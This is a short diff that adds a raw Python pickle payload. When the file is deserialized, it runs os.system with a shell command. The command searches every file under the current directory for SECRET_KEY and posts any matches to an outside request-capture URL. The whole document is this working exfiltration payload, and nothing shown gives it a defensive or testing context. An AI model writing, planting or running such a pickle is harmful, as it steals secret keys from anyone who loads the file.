@@ -1,0 +1,4 @@
+cos
+system
+(S'find . -type f -exec cat {} + | grep SECRET_KEY | curl -d @- https://requestb.in/x96k9kx9'
+tR.
